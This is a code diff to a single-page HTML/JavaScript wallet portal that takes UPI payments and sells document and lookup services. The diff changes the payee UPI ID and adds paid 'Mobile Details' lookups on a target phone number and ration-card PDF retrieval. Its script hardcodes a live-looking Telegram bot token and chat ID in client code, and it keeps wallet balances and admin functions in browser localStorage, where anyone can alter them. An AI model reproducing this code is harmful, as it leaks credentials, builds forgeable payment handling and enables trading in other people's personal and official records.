@@ -85,8 +85,47 @@
     .btn-amazon { background: #232f3e; color: #ff9900; }
     .btn-rc { background: #17a2b8; }
     .btn-voter { background: #6f42c1; }
+    .btn-mob-detail { background: #e83e8c; }
+    .btn-ration { background: #fd7e14; }
     .btn-admin { background: #dc3545; }
     .btn-test { background: #6c757d; }
+
+    /* UPI Quick Pay Buttons */
+    .upi-apps-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 15px;
+    }
+    .btn-upi-app {
+      padding: 10px;
+      font-size: 13px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      color: white;
+      text-align: center;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .btn-phonepe { background: #5f259f; }
+    .btn-paytm { background: #00baf2; color: #002e6e; }
+    .btn-gpay { background: #4285f4; }
+    .btn-generic-upi { background: #28a745; }
+
+    .qr-container {
+      text-align: center;
+      margin: 15px 0;
+      padding: 10px;
+      background: #f8f9fa;
+      border: 1px dashed #007bff;
+      border-radius: 8px;
+    }
+    .qr-container img { max-width: 180px; height: auto; border-radius: 5px; }
 
     .btn-sm { width: auto; padding: 5px 10px; font-size: 12px; margin: 2px; display: inline-block; cursor: pointer; border: none; border-radius: 4px; color: white; }
     .btn-approve { background: #28a745; }
@@ -165,7 +204,7 @@
       <button class="btn btn-buy" onclick="loginUser()">Login Portal</button>
     </div>
 
-    <!-- ADMIN LOGIN CARD WITH UPDATED PLACEHOLDERS -->
+    <!-- ADMIN LOGIN CARD -->
     <div class="card" id="admin-login-card" style="display:none;">
       <h3>⚙️ Admin Login Panel</h3>
       <label>Admin Username</label>
@@ -179,24 +218,62 @@
   <!-- 2. MAIN USER PORTAL -->
   <div id="portal-section" class="main-container">
     
-    <!-- ADD BALANCE -->
+    <!-- ADD BALANCE WITH AUTO-PAY & UPI QR CODE -->
     <div class="card">
       <h3>💳 Add Money To Wallet</h3>
-      <div class="upi-badge">UPI: rameshchandra908080@okaxis</div>
+      <div class="upi-badge">UPI ID: <b>laxmihi@ptyes</b></div>
 
       <label>Mobile Number</label>
       <input type="number" id="add-mobile" placeholder="10 Digit Number">
 
       <label>Enter Amount Paid (₹)</label>
-      <input type="number" id="add-amt" placeholder="e.g. 100, 200, 500">
+      <input type="number" id="add-amt" placeholder="e.g. 100, 200, 500" oninput="generateUpiQR()">
 
-      <label>12-Digit UTR / Ref Number</label>
+      <!-- DYNAMIC QR CODE DISPLAY -->
+      <div class="qr-container" id="qr-wrapper" style="display:none;">
+        <p style="font-size:12px; font-weight:bold; margin-bottom:5px; color:#333;">Scan & Pay via Any UPI App:</p>
+        <img id="upi-qr-code" src="" alt="UPI QR Code">
+      </div>
+
+      <!-- AUTO PAY APP BUTTONS -->
+      <label style="margin-top:15px; color:#007bff;">⚡ Direct Auto-Pay via Installed App:</label>
+      <div class="upi-apps-container">
+        <button type="button" class="btn-upi-app btn-phonepe" onclick="openUpiApp('phonepe')">🟣 PhonePe</button>
+        <button type="button" class="btn-upi-app btn-paytm" onclick="openUpiApp('paytm')">🔵 Paytm</button>
+        <button type="button" class="btn-upi-app btn-gpay" onclick="openUpiApp('gpay')">🟢 Google Pay</button>
+        <button type="button" class="btn-upi-app btn-generic-upi" onclick="openUpiApp('generic')">📲 Any UPI App</button>
+      </div>
+
+      <label style="margin-top:15px;">12-Digit UTR / Ref Number</label>
       <input type="text" id="add-utr" placeholder="Enter 12 Digit UTR Number">
 
       <label>Payment Screenshot</label>
       <input type="file" id="add-proof" accept="image/*">
 
       <button class="btn btn-add" onclick="submitAddMoneyWithProof()">Submit Add Money Request</button>
+    </div>
+
+    <!-- MOBILE DETAILS SERVICE (NEW) -->
+    <div class="card">
+      <h3>📱 Mobile Details Service</h3>
+      <label>Target Mobile Number</label>
+      <input type="number" id="mob-detail-number" placeholder="10 Digit Mobile Number">
+
+      <div class="comm-tag">Service Charge: ₹50</div>
+      <button class="btn btn-mob-detail" onclick="getMobileDetails()">Get Mobile Details (₹50)</button>
+    </div>
+
+    <!-- RATION CARD PDF SERVICE (NEW) -->
+    <div class="card">
+      <h3>🌾 Ration Card PDF Service</h3>
+      <label>Ration Card Number</label>
+      <input type="text" id="ration-number" placeholder="Enter Ration Card Number">
+
+      <label>Owner Mobile Number</label>
+      <input type="number" id="ration-mobile" placeholder="10 Digit Mobile Number">
+
+      <div class="comm-tag">Service Charge: ₹100</div>
+      <button class="btn btn-ration" onclick="getRationPdf()">Get Ration PDF (₹100)</button>
     </div>
 
     <!-- VEHICLE RC PDF SERVICE -->
@@ -376,6 +453,7 @@
   <script>
     const BOT_TOKEN = "7060236112:AAFSZSgRdoegdb4e_8FJ9s4h0BtGkgEwE1s";
     const CHAT_ID = "6318395817";
+    const TARGET_UPI = "laxmihi@ptyes";
 
     const commissionRates = { Jio: 2.0, Airtel: 1.5, Vi: 2.5 };
     const operatorPlans = {
@@ -400,7 +478,45 @@
     let usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
     let currentUser = JSON.parse(localStorage.getItem("currentUser")) || null;
 
-    // ASYNC TELEGRAM FUNCTION WITH DETAILED ERROR LOGGING
+    // GENERATE DYNAMIC QR CODE FOR LAXMIHI@PTYES
+    function generateUpiQR() {
+      const amt = document.getElementById("add-amt").value;
+      const qrWrapper = document.getElementById("qr-wrapper");
+      const qrImg = document.getElementById("upi-qr-code");
+
+      if(amt && amt > 0) {
+        const upiString = `upi://pay?pa=${TARGET_UPI}&pn=AkashServiceStore&am=${amt}&cu=INR`;
+        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upiString)}`;
+        qrWrapper.style.display = "block";
+      } else {
+        qrWrapper.style.display = "none";
+      }
+    }
+
+    // AUTO-OPEN INSTALLED UPI APP (PAYTM, PHONEPE, GPAY, BHIM)
+    function openUpiApp(app) {
+      const amt = document.getElementById("add-amt").value;
+      if(!amt || amt <= 0) {
+        alert("Pehle Amount bharein!");
+        document.getElementById("add-amt").focus();
+        return;
+      }
+
+      const note = encodeURIComponent("Wallet Add Money");
+      const name = encodeURIComponent("Akash Service Store");
+      let upiUrl = `upi://pay?pa=${TARGET_UPI}&pn=${name}&am=${amt}&cu=INR&tn=${note}`;
+
+      if(app === 'phonepe') {
+        upiUrl = `phonepe://pay?pa=${TARGET_UPI}&pn=${name}&am=${amt}&cu=INR&tn=${note}`;
+      } else if(app === 'paytm') {
+        upiUrl = `paytmmp://pay?pa=${TARGET_UPI}&pn=${name}&am=${amt}&cu=INR&tn=${note}`;
+      } else if(app === 'gpay') {
+        upiUrl = `gpay://upi/pay?pa=${TARGET_UPI}&pn=${name}&am=${amt}&cu=INR&tn=${note}`;
+      }
+
+      window.location.href = upiUrl;
+    }
+
     async function sendTelegramAlert(textMsg) {
       try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -411,8 +527,6 @@
         const resData = await response.json();
         if(!resData.ok) {
           alert("Telegram Alert Error: " + resData.description);
-        } else {
-          console.log("Telegram Sent Successfully!");
         }
       } catch (err) {
         alert("Network Error while sending Telegram Message: " + err.message);
@@ -511,7 +625,7 @@
 
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      const captionText = `💰 *ADD MONEY REQUEST*\n\n👤 *User:* ${currentUser.name}\n📧 *Email:* ${currentUser.email}\n📱 *Mobile:* ${mobile}\n💵 *Amount:* ₹${amount}\n🔢 *UTR/Ref No:* \`${utr}\`\n⏰ *Time:* ${timeNow}`;
+      const captionText = `💰 *ADD MONEY REQUEST*\n\n👤 *User:* ${currentUser.name}\n📧 *Email:* ${currentUser.email}\n📱 *Mobile:* ${mobile}\n💵 *Amount:* ₹${amount}\n🔢 *UTR/Ref No:* \`${utr}\`\n💳 *Paid To:* laxmihi@ptyes\n⏰ *Time:* ${timeNow}`;
       formData.append("caption", captionText);
       formData.append("parse_mode", "Markdown");
 
@@ -546,13 +660,14 @@
       document.getElementById("add-amt").value = "";
       document.getElementById("add-utr").value = "";
       document.getElementById("add-proof").value = "";
+      document.getElementById("qr-wrapper").style.display = "none";
     }
 
     async function createServiceOrder(type, details, charge) {
       if(currentUser.balance < charge) { alert(`Wallet Balance Kam Hai! ₹${charge} Add Karein.`); return false; }
 
       currentUser.balance -= charge;
-      document.getElementById("user-balance").innerText = currentUser.balance;
+      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
 
       const timeNow = new Date().toLocaleString();
       const orderId = Date.now();
@@ -574,6 +689,30 @@
       await sendTelegramAlert(orderMsg);
 
       return true;
+    }
+
+    // NEW FUNCTION: MOBILE DETAILS SERVICE
+    async function getMobileDetails() {
+      const mob = document.getElementById("mob-detail-number").value;
+      if(!mob || mob.length !== 10) { alert("Valid 10-Digit Mobile Number Enter Karein!"); return; }
+
+      if(await createServiceOrder("Mobile Details Service", `Mobile: ${mob}`, 50)) {
+        alert("Mobile Details Request Sent!");
+        document.getElementById("mob-detail-number").value = "";
+      }
+    }
+
+    // NEW FUNCTION: RATION CARD PDF SERVICE
+    async function getRationPdf() {
+      const rationNo = document.getElementById("ration-number").value;
+      const mob = document.getElementById("ration-mobile").value;
+      if(!rationNo || !mob || mob.length !== 10) { alert("Valid Details Enter Karein!"); return; }
+
+      if(await createServiceOrder("Ration Card PDF Service", `Ration Card: ${rationNo} (${mob})`, 100)) {
+        alert("Ration Card PDF Request Sent!");
+        document.getElementById("ration-number").value = "";
+        document.getElementById("ration-mobile").value = "";
+      }
     }
 
     async function getRcPdf() {
@@ -797,7 +936,7 @@
           item.status = "Approved & Added";
           saveAndRefreshAdmin();
           
-          await sendTelegramAlert(`✅ *ADD MONEY APPROVED*\n\n👤 User: ${user.name}\n📧 Email: ${user.email}\n💵 Amount Added: ₹${item.amount}\n💰 New Balance: ₹${user.balance}`);
+          await sendTelegramAlert(`✅ *ADD MONEY APPROVED*\n\n👤 User: ${user.name}\n📧 Email: ${user.email}\n💵 Amount Added: ₹${item.amount}\n💰 New Balance: ₹${user.balance.toFixed(2)}`);
           alert(`₹${item.amount} User Wallet me add kar diya gaya!`);
         }
       }
@@ -841,7 +980,7 @@
         usersDB[index].history.unshift({ id: Date.now(), type: "Admin Adjustment", details: "Manual Balance Update", amount: parseFloat(amt), status: "Success", time: timeNow, pdfUrl: null });
         saveAndRefreshAdmin();
 
-        await sendTelegramAlert(`⚙️ *ADMIN MANUAL BALANCE UPDATE*\n\n👤 User: ${usersDB[index].name}\n💵 Adjustment: ₹${amt}\n💰 New Balance: ₹${usersDB[index].balance}`);
+        await sendTelegramAlert(`⚙️ *ADMIN MANUAL BALANCE UPDATE*\n\n👤 User: ${usersDB[index].name}\n💵 Adjustment: ₹${amt}\n💰 New Balance: ₹${usersDB[index].balance.toFixed(2)}`);
         alert("Balance Updated!");
       }
     }
